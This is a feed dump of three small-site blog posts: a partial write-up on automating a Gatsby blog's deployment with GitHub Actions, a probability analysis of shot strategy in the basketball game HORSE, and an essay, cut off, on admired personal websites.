<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></p><p>I wanted to insert a gif of the filtering taking place. Apparently that's easier said than done with Gatsby and<code>gatsby-transform-remark</code>.  I'll update this post once I get gifs working 🙄.</p></div>
<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>
  
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>trigger</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
     <span>-</span> <span>name</span><span>:</span> Trigger Upstream Blog Action
        <span>run</span><span>:</span> <span>|</span><span>
          curl -XPOST \
          -u "${{ secrets.PAT_USERNAME}}:${{secrets.PAT_TOKEN}}" \
          -H "Accept: application/vnd.github.everest-preview+json" \
          -H "Content-Type: application/json" \
          https://api.github.com/repos/steven-terrana/steven-terrana.github.io/dispatches \
          --data '{"event_type": "blog"}'</span></code></pre></div>
<h3 id="step-2-github-action-on-the-blog-repo"><a href="#step-2-github-action-on-the-blog-repo" aria-label="step 2 github action on the blog repo permalink"></a>Step 2: GitHub Action on the Blog Repo</h3>
<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish
<span>on</span><span>:</span>
  <span>repository_dispatch</span><span>:</span>
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>build-deploy-notify</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
      
      <span>-</span> <span>name</span><span>:</span> Checkout Code 🛎
        <span>uses</span><span>:</span> actions/checkout@v2
        <span>with</span><span>:</span> 
          <span>persist-credentials</span><span>:</span> <span>false</span>
       <span>-</span> <span>name</span><span>:</span> Install &amp; Build 🔧
        <span>run</span><span>:</span> <span>|</span><span>
          npm ci
          npm run build
          echo "buzzword.engineering" &gt; public/CNAME</span>
        <span>env</span><span>:</span> 
          <span>PAT_USER</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_USER <span>}</span><span>}</span>
          <span>PAT_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_TOKEN <span>}</span><span>}</span>
      <span>-</span> <span>uses</span><span>:</span> peaceiris/actions<span>-</span>gh<span>-</span>pages@v3
        <span>with</span><span>:</span>
          <span>github_token</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>
          <span>publish_dir</span><span>:</span> public
          <span>force_orphan</span><span>:</span> <span>true</span>  </code></pre></div>
<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>
<li>I use the <code>peaceiris/actions-gh-pages</code> action to publish the site. </li>
</ol>
<p>All in all, this was a pretty painless setup. </p>
<h3 id="step-3-automating-tweets"><a href="#step-3-automating-tweets" aria-label="step 3 automating tweets permalink"></a>Step 3: Automating Tweets</h3>
<p>So at this point, we've got content changes automatically getting deployed to GitHub Pages. The whole process takes about <strong>three minutes</strong> from commit to publish. </p>
<p>The last piece was to automate letting all of you know about the whatever new insightful thing I had to say! </p>
<p>I had stumbled on <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> before through targeted ads and sort of ignored it until I saw <a href="https://twitter.com/rawkode" target="_blank" rel="nofollow noopener noreferrer">David McKay</a> talk about how much he loves it on <a href="https://rawkode.live/" target="_blank" rel="nofollow noopener noreferrer">rawkode.live</a>. Here's a <a href="https://youtu.be/Q8ZJ_5zxfmo" target="_blank" rel="nofollow noopener noreferrer">link to the stream</a>!</p>
<p>I went into this adventure thinking I was going to have to do all kinds of fancy logic and scripting to make this possible. I was wrong. </p>
<p>After setting up a Pipedream account, starting looking at what event sources were available to trigger a workflow. Well, the Lumen gatsby …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://buzzword.engineering/post/blog-tech-stack">https://buzzword.engineering/post/blog-tech-stack</a></em></p>]]>
            </description>
            <link>https://buzzword.engineering/post/blog-tech-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556272</guid>
            <pubDate>Mon, 28 Dec 2020 02:56:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's the best strategy when playing HORSE? (basketball)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25556148">thread link</a>) | @rishicomplex
<br/>
December 27, 2020 | https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html | <a href="https://web.archive.org/web/*/https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p><strong>TL;DR</strong>: If you want to win at HORSE, it’s generally a much better strategy to attempt high percentage shots. It almost never makes sense to shoot crazy half-court shots or behind-the-back shots. As a general rule of thumb, never attempt shots that you can’t shoot at &gt;50%.</p>

<hr>

<p><br>
<a href="https://en.wikipedia.org/wiki/Variations_of_basketball#H-O-R-S-E">HORSE</a> is a popular basketball shooting game. The main choice a HORSE player must make is which spots on the basketball court to attempt shots from. What’s the best strategy to win at HORSE?</p>

<ul id="markdown-toc">
  <li><a href="#game-rules" id="markdown-toc-game-rules">Game rules</a></li>
  <li><a href="#expected-number-of-turns" id="markdown-toc-expected-number-of-turns">Expected number of turns</a>    <ul>
      <li><a href="#deriving-the-formula" id="markdown-toc-deriving-the-formula">Deriving the formula</a></li>
      <li><a href="#visualizing-the-expected-number-of-turns" id="markdown-toc-visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</a></li>
      <li><a href="#verification-via-simulation" id="markdown-toc-verification-via-simulation">Verification via simulation</a></li>
    </ul>
  </li>
  <li><a href="#analyzing-some-special-cases" id="markdown-toc-analyzing-some-special-cases">Analyzing some special cases</a>    <ul>
      <li><a href="#both-players-are-equally-good-shooters" id="markdown-toc-both-players-are-equally-good-shooters">Both players are equally good shooters</a></li>
      <li><a href="#player-1-is-a-slightly-better-shooter-than-player-2" id="markdown-toc-player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</a></li>
      <li><a href="#player-2-is-a-slightly-better-shooter-than-player-1" id="markdown-toc-player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</a></li>
    </ul>
  </li>
  <li><a href="#real-world-strategies" id="markdown-toc-real-world-strategies">Real world strategies</a></li>
</ul>

<h3 id="game-rules">Game rules</h3>
<p>The version of HORSE I’m analysing here involves two players. In the beginning, it’s Player 1’s turn. The player whose turn it is will be called “C”, and the other player will be called “O”.</p>
<ol>
  <li>C picks a spot on the basketball court and attempts a shot.
    <ul>
      <li>If C misses the shot, it is O’s turn, and we go back to 1.</li>
    </ul>
  </li>
  <li>If C makes the shot, O must now attempt the same shot.
    <ul>
      <li>If O makes the shot, C’s turn continues, and we go back to 1.</li>
      <li>If O misses the shot, they get a letter. C’s turn continues, and we go back to 1.</li>
    </ul>
  </li>
  <li>Once any player has gotten 5 letters, ie HORSE, they lose the game.</li>
</ol>

<p>On Player 2’s turn, Player 1 has no real strategy - they must simply try their best to make the shots that Player 2 makes. The only strategy a player can control is which shots they attempt when it’s their turn.</p>

<h3 id="expected-number-of-turns">Expected number of turns</h3>

<h4 id="deriving-the-formula">Deriving the formula</h4>

<p>Let us calculate the optimal shot on Player 1’s turn. Note that a “turn” lasts as long as the player whose turn it is does not miss their shot. We will assume that Player 1 will shoot the same optimal shot each time it is their turn. Let \(p_1\) be the probability that Player 1 makes this shot, \(p_2\) be the probability that Player 2 makes the same shot, and \(e_N\) be the expected number of turns for Player 1 to win \(N\) letters.</p>

<p>If Player 1 misses the shot, the expected number of turns going forward is \(1 + e_N\), since Player 1 has used up the current turn, and must restart in the same position next turn. If Player 1 makes the shot, and Player 2 misses the shot, the expected number of turns is \(e_{N-1}\), since the turn continues with one less letter to win. Finally, if Player 1 and Player 2 both make the shot, the expected number of turns is simply \(e_N\). Putting these together, we have</p><p>

\[\begin{equation}
e_N = (1 - p_1) (1 + e_N) + p_1 (1 - p_2) e_{N - 1} + p_1 p_2 e_N
\end{equation}\]

</p><p>Re-arranging and expanding for \(e_{N-1},e_{N-2}\ldots e_0\), we get</p><p>

\[\begin{eqnarray}
e_N - e_{N - 1} &amp;= \frac{1 - p_1}{p_1 (1 - p_2)} \\
\vdots \\
e_1 - e_0 &amp;= \frac{1 - p_1}{p_1 (1 - p_2)}
\end{eqnarray}\]

</p><p>\(e_0\) must be \(1\), since \(p_1=1, p_2=0 \implies e_1=1\). Adding the equations above and re-arranging, we get</p><p>

\[e_N = 1 + N\frac{1 - p_1}{p_1 (1 - p_2)}\]

</p><p>For the game of HORSE, \(N=5\), and so the expected number of turns to win HORSE is</p><p>

\[e_5 = 1 + 5\frac{1 - p_1}{p_1 (1 - p_2)} \tag{1} \label{eq:one}\]

</p><p>Our goal is to minimize \(e_5\). \(e_5\) increases with the inverse of the quantities \(\frac{p_1}{1 - p_1}\) and \((1 - p_2)\). Since the former grows much faster than the latter, we can intuit that increasing \(p_1\) is a lot more important than decreasing \(p_2\).</p>

<h4 id="visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</h4>

<p>Since this is a function of two variables, we can visualize it with a contour plot.</p>

<p><img src="https://rishicomplex.github.io/assets/formula.png" alt="Contour plot of function"></p>

<p>As the color gets darker, the expected number of turns decreases, ie we’re more likely to win. As we would expect, the plot gets darker for higher values of \(p_1\) and lower values of \(p_2\), ie to the right and bottom of the plot. What’s interesting to note is that the contour lines are “squeezed” more toward the right than the bottom, indicating that a high \(p_1\) has a stronger effect than a low \(p_2\). For example, if \(p_2=0\) and \(p_1=0.2\), \(\eqref{eq:one}\) gives us \(e_5=21\), whereas if \(p_1=1\) and \(p_2=0.8\) we get \(e_5=1\).</p>

<h4 id="verification-via-simulation">Verification via simulation</h4>

<p>Another way to calculate \(e_5\) empirically is to simulate \(G\) games for each value of \(p_1\) and \(p_2\), and then average the number of turns the game takes to finish over all the games. Doing this with \(G=1000\), I get this plot:</p>

<p><img src="https://rishicomplex.github.io/assets/simulation.png" alt="Contour plot of simulation"></p>

<p>which matches the previous plot. The squiggles are due to randomness.</p>

<h3 id="analyzing-some-special-cases">Analyzing some special cases</h3>

<p>In reality, \(p_1\) and \(p_2\) tend to be related to one another, since shots that are harder for one player tend to be harder for the other player as well.</p>

<p>Let us analyse some special cases, corresponding to the straight lines in the following plot.</p>

<p><img src="https://rishicomplex.github.io/assets/straight_lines.png" alt="Contour plot with straight lines"></p>

<h4 id="both-players-are-equally-good-shooters">Both players are equally good shooters</h4>
<p>This corresponds to the red line above. Here, \(p_1 = p_2\), and \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + \frac{5}{p_1}\]

</p><p>To minimize this, we should pick shots with a \(p_1\) as high as possible. For example, if we keep making layups at a probability of \(0.9\) each, we’d expect the game to be over in less than \(7\) turns.</p>

<h4 id="player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</h4>

<p>Let’s say Player 1 always shoots 10% better than Player 2 for any shot. That is, \(p_2 = min(p_1 - 0.1, 0)\) (yellow line above), and when \(p1&gt;0.1\), \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (1.1 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_better.png" alt="Player 1 better"></p>

<p>It is minimized at \(p_1=1\), where \(e_5=1\), that is, the game ends in one turn. Again, Player 1 wants to pick their highest probability shot.</p>

<h4 id="player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</h4>

<p>Here, we set \(p_2 = p_1 + 0.1\) (orange line above), which gives us for \(p_1 &lt; 0.9\)</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (0.9 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_worse.png" alt="Player 1 worse"></p>

<p>Interestingly, we cannot simply maximize \(p_1\) here, because once \(p_2\) gets closer to \(1\), we can never win. However, the optimal \(p_1\) is still pretty high, at around \(p_1=0.684\), giving \(e_5=11.7\). If Player 2 (for whom \(e_5\) looks like the previous section) shoots shots at \(p_2&lt;0.4\) (eg three-point shots), they will lose the game, despite being a better shooter.</p>

<h3 id="real-world-strategies">Real world strategies</h3>

<p>In the real world, winning is not the only objective. You don’t want the game to take indefinitely long, and you’d be ridiculed if you kept taking layups. You also have no concrete way to estimate \(p_1\) and \(p_2\) (unless you’ve been playing an opponent for a long time and are keeping a tab on their shooting percentages), and so have to rely on intuition. Some general points to keep in mind:</p>

<ul>
  <li>You’re generally better off taking high percentage shots, even if you’re much better at a low-percentage shot than an opponent. As an example, let’s say you’ve been practicing half-court shots all year, and you can shoot a half court shot at an impressive 20% (\(p_1=0.2\)). You’re sure your opponent can’t shoot that shot if you make it (\(p_2=0\)). Your expected number of turns to win is still \(e_5=21\). Compare that to you shooting a 60% shot which your opponent can also make at 60% (eg a free throw), which lets you win in \(e_5=9.3\) turns. This is more than twice as good as the half court shot! This is because if you and your opponent both make the shot, it’s still your turn. Whereas if you miss your shot by attempting a low percentage shot, your turn is over. You can always win the game in 6-7 turns simply by taking layups at the same percentage as your opponent (assuming \(p_1\) of 0.8-0.9). If we set \(p_2=0\), and solve for \(e_5=7\), we get \(p_1 = 0.45\). That is, even if your opponent can’t make the shot you make at all, there’s generally no point in taking shots that have \(p_1 &lt; 0.45\) - you’re better off shooting layups.</li>
  <li>If you can guess \(p_1\) and \(p_2\) for a bunch of candidate shots, plug them into \(\eqref{eq:one}\) to figure out which shots are your best bet to win.</li>
  <li>Instead of practicing low percentage shots (like behind the backboard arc shots), practice your high percentage shots (like free throws or left handed layups) instead. If you and your opponent can both make a behind the backboard arc shot at 10%, and you practice to push yourself to 20%, you still go from winning in 51 turns to 23 turns. Compare that with converting your free throw from 60% to 70% - that pushes your expected turns from 9.3 to 6.4.</li>
  <li>Find novel-looking high percentage shots so that you can use an effective strategy while not getting ridiculed for just attempting layups. Examples are left handed close up shots, floaters, bank shots.</li>
</ul>

<p>I’d also recommend playing HORSE with modified rules, eg</p>
<ul>
  <li>No shots from inside the paint.</li>
  <li>No repeated shots from the same spot in a turn.</li>
  <li>If both players make three shots in a row, it’s Player 2’s turn.</li>
</ul>

<p>This should reduce the effectiveness of the layup strategy and make the game more fun.</p>

<hr>

<p><br>
The code for the plots in this post is <a href="https://colab.research.google.com/drive/18yF27zs80UF9TgFm4p7I5U4cDYn1V6A3?usp=sharing">here</a>.</p>

  </div>
</article>
<!-- Mathjax Support -->


      </div>
    </div></div>]]>
            </description>
            <link>https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556148</guid>
            <pubDate>Mon, 28 Dec 2020 02:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal Websites and Internet Writing]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555725">thread link</a>) | @healeycodes
<br/>
December 27, 2020 | https://healeycodes.com/personal-websites-and-internet-writing/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/personal-websites-and-internet-writing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I chose five personal websites out of the thirty or so I visit regularly and tried to understand what it is about them that utterly captures me.</p>
<p>Whether or not it is obvious to you, I have stolen many things from the following websites. Be it design tweaks, post ideas, or even turns of phrase. These websites are incredible and you should consume them.</p>
<p>Good artists borrow, great artists <del>steal</del> use the inspect tool.</p>

<p>I have been following Justin Duke’s writing for close to two years. His older page is now <a href="https://jmduke.com/">depreciated</a> and he posts to <em>arcana dot computer</em>, an <a href="https://github.com/jmduke/arcana.computer">open source</a> website filled with catalogs and footnotes and light-touch design. The main framework is Jekyll, with dynamic content powered by Airtable. The <a href="https://arcana.computer/miscellany/this-site.html">About</a> page of Justin’s website explains the development/design/ideas behind the website in rich detail. So in this section I’ll instead focus on how I <em>feel</em> about the website.</p>
<p><span>
      <a href="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The index page of arcana.computer." title="The index page of arcana.computer." src="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" srcset="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/a8a0d/arcana.computer.png 300w,
https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/dface/arcana.computer.png 600w,
https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png 640w" sizes="(max-width: 640px) 100vw, 640px" loading="lazy">
  </a>
    </span></p>
<p>My philosophy towards personal websites matches Justin’s. He writes:</p>
<blockquote>
<p>Lastly, if there’s anything I can convince you of: you should build a personal site, you should obsess over it, you should meticulously document it, and you should have quite a bit of fun doing so. (It’s worth it.)</p>
</blockquote>
<p>The content throughout these pages is personal and reads true. Although it’s not a journal as such, as I read through the notes and reviews I get a secret feeling that I’m looking somewhere I shouldn’t be — like peeking in a hidden diary.</p>
<p>Justin writes about capturing his <a href="https://arcana.computer/catalogs/media-diet">media diet</a>:</p>
<blockquote>
<p>This started out as a lazy compulsion, but I’ve grown rather found of this habit over time. “You are what you eat”, and all that — I’ve realized that paying more attention to how I’m spending my consumptive time has made me more focused on consuming what I’m interested in, and not simply what’s easiest.</p>
</blockquote>
<p>He talks about reviewing older sections of his media diet and how it helps him recollect that time in his life — “suddenly I am taken back to my old apartment on Capitol Hill, and my three weeks of funemployment before Stripe”. When coming across old words that I have written, I’ve also experienced this almost-olfactory flashback of thoughts.</p>
<p><span>
      <a href="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The catalog listing of arcana.computer." title="The catalog listing of arcana.computer." src="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png" srcset="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png 298w" sizes="(max-width: 298px) 100vw, 298px" loading="lazy">
  </a>
    </span></p>
<p>Overall, I am impressed with the breadth and depth of content on Justin’s website, as well as how he’s made Airtable work for him. I also like that sections are marked as in-progress. I like the personal structure to it. His methods for working on this website are similar to the goals of the <a href="https://en.wikipedia.org/wiki/Long_Now_Foundation">Long Now</a> and that gels with me.</p>

<p>Paul Stamatiou writes long form articles about his life and technology. If someone has a curiosity about a subject that he has covered (e.g. <a href="https://paulstamatiou.com/made-on-an-ipad-pro/">creating with the iPad Pro</a>, or <a href="https://paulstamatiou.com/building-a-windows-10-lightroom-photo-editing-pc/">building a lightroom PC</a>) I wouldn’t hesitate linking one of his articles to them — perhaps without even reading it — because of the consistent high quality I have come to expect.</p>
<p><span>
      <a href="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Paul Stamatiou's website." title="Paul Stamatiou's website." src="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" srcset="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/a8a0d/paulstamatiou.com.png 300w,
https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/dface/paulstamatiou.com.png 600w,
https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png 750w" sizes="(max-width: 750px) 100vw, 750px" loading="lazy">
  </a>
    </span></p>
<p>However, this quality comes with a cost, as he describes in <a href="https://paulstamatiou.com/writing-more/">Writing more</a>:</p>
<blockquote>
<p>I’m going to try something different and write more short-form posts here.</p>
</blockquote>
<blockquote>
<p>Over the years my focus has been increasing the quality of my articles. They’ve ended up becoming increasingly time-consuming to create.</p>
</blockquote>
<p>Although these articles (which for now he seems to have dubbed “briefs”) are shorter and less researched than his other writing they read as complete entries to me. On another website, by another person, they would be complete blog posts.</p>
<p>The more things I write, the more hesitant I am to actually publish. So the way he talks about blogging in <em>Writing more</em> resonates with me:</p>
<blockquote>
<p>I want to get back to what blogging felt like when I started in 2005. Back when posting a few sentences and publishing it within the same computing session was so easy and fun. Where expectations were low and it didn’t have to be perfect.</p>
</blockquote>
<p>He has written 1210 posts since 2005. My first thought goes to the build times of such a website! In 2011, he migrated from <a href="https://paulstamatiou.com/how-to-wordpress-to-jekyll/">Wordpress to Jekyll</a>. This year he <a href="https://twitter.com/Stammy/status/1307347164599922689">tweeted</a> that he’s looking at moving again:</p>
<blockquote>
<p>really, really want to migrate my jekyll blog to Hugo + Netlify but I have so many weird jekyll hacks and collections and templates/includes that I’m sure the migration would take months of spare time.</p>
</blockquote>
<blockquote>
<p>probably faster to build a new site from the ground up, new CSS and all</p>
</blockquote>
<p>Also this year, he was interviewed about his work (he’s a designer at Twitter) and about his blog on <a href="https://www.thundernerds.io/2019/10/writing-a-blog-and-working-at-twitter-with-paul-stamatiou/">Thunder Nerds</a>. (More people should be interviewed about their technology blogs please.)</p>
<p>Paul is a photographer who generates fantastic photo sets and write ups with little animated maps of the location. His <a href="https://paulstamatiou.com/photos/">photos</a>, and the way they are arranged, is truly fantastic. He has of course written <a href="https://paulstamatiou.com/photos/gear/">thousands of words</a> about his camera gear.</p>

<p>Martin Tournoij is the creator of <a href="https://www.goatcounter.com/">Goat Counter</a> and has posts dating back to 2013. His personal website is Jekyll-based and <a href="https://github.com/arp242/arp242.net">open source</a>. I usually run into his writing on <a href="https://lobste.rs/">lobste.rs</a> (a computing-focused community).</p>
<p><span>
      <a href="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Posts by Martin Tournoij" title="Posts by Martin Tournoij" src="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png" srcset="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/a8a0d/arp242-posts.png 300w,
https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png 427w" sizes="(max-width: 427px) 100vw, 427px" loading="lazy">
  </a>
    </span></p>
<p>I like the one-page layout of the landing page. There’s a list of posts and projects, a picture, and a link to his CV. My favorite post of his is <a href="https://www.arp242.net/personal-analytics.html">Analytics on personal websites</a> — where he argues in part for vanity statistics:</p>
<blockquote>
<p>As for “vanity stats” or “stats to stroke your ego”: I think that’s actually a valid use case as well. After you spent quite a bit of your spare time writing an article it’s just nice to know people are actually reading it. There’s nothing wrong with being validated – it’s a basic psychological need and I’m not a fan of casually dismissing it.</p>
</blockquote>
<p>Later on, he wrestles with the fact that since he’s the creator of an analytics tool, he doesn’t want this website to turn into an advertising channel for it.</p>
<p>Martin doesn’t shy away from controversial subjects on his blog. He writes about freedom and democracy, he pushes for empathy towards those he disagrees with. He writes without restraint which is admirable in itself.</p>
<p>He uses his own CSS template (<a href="https://github.com/arp242/hello-css">arp242/hello-css</a>) which is worth a look. If you’ll allow me to use a vague statement, his website has a unique visual readability to it.</p>

<p>Joel Califa’s website has whimsy. It doesn’t take itself seriously.</p>
<p><span>
      <a href="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The third section of Joel Califa's website" title="The third section of Joel Califa's website" src="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png" srcset="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/a8a0d/joel-buttons.png 300w,
https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/dface/joel-buttons.png 600w,
https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png 636w" sizes="(max-width: 636px) 100vw, 636px" loading="lazy">
  </a>
    </span></p>
<p>Clicking this button makes text spawn and fly away and fade (the snippets are things from the old web like: <code>&lt;i&gt;</code>, <code>&lt;frameset&gt;</code>, <code>&lt;marquee&gt;</code>, etc). There’s an illustration of his head that hides away when you hover near. The writing in the section headers frizzles with energy.</p>
<p>Joel’s website successfully serves as both a work portfolio and a design blog. His <em>Work</em> page describes itself as a “A sample of text-heavy case studies for patient visitors.” The design blog has “Low frequency, high quality design articles.”</p>
<p>My favorite post is <a href="http://joelcalifa.com/blog/tiny-wins/">Tiny Wins</a>:</p>
<blockquote>
<p>I recently shipped two things at GitHub that had an impact beyond my wildest dreams.</p>
</blockquote>
<p>Where he discusses the work involved in designing dynamic favicons for the Pull Request page:</p>
<blockquote>
<p>Now browser tabs will always show a PR’s current build status.</p>
</blockquote>
<p>As well as adding an arrow that signals which branch your changes are “flowing” into:</p>
<blockquote>
<p>Before releasing this, people would regularly confuse which branch would be merged into which.</p>
</blockquote>
<p>He writes with authentic authority. He covers subjects that seem so obvious after you read them. Like in <a href="http://joelcalifa.com/blog/revisiting-visited/">Revisiting :Visited</a>, where research, the web specification, and its practical uses, are combined:</p>
<blockquote>
<p>A Nielsen study summed this up nicely over ten years ago, “People get lost and move in circles when websites use the same link color for visited and new destinations. To reduce navigational confusion, select different colors for the two types of links.”</p>
</blockquote>
<blockquote>
<p>Can’t we, as an industry, get behind that reasoning? A “visited” link isn’t that far off from a “read” email. They both provide the user with the tacit understanding of where they’ve been.</p>
</blockquote>
<p>Joel exists in the wonderful space between technology and design where he is addressing problems that directly relate to me. For example, his website is the first place I read <a href="http://joelcalifa.com/blog/unsolicited-dating-advice/">a serious defense</a> of the <code>month/day/year</code> date ordering system.</p>
<p>It fills me with joy that I have only read half of his content.</p>

<p>Rasmus Andersson has the prettiest website in this list. An elegant three-column layout that perfectly scales to the browser’s width — dropping to two columns then one column. When a page is selected from the top right menu, the background changes to a rich color and shifts the menu up or down. With a wide enough browser, gray bars frame the website on either side.</p>
<p><span>
      <a href="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="rsms.me main menu." title="rsms.me main menu." src="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png" srcset="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png 159w" sizes="(max-width: 159px) 100vw, 159px" loading="lazy">
  </a>
    </span></p>
<p>Rasmus is the creator of the <a href="https://rsms.me/inter/">Inter</a> font and uses it to great effect with bold hover colors.</p>
<p><span>
      <a href="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png" target="_blank" rel="noopener">
    <span></span>
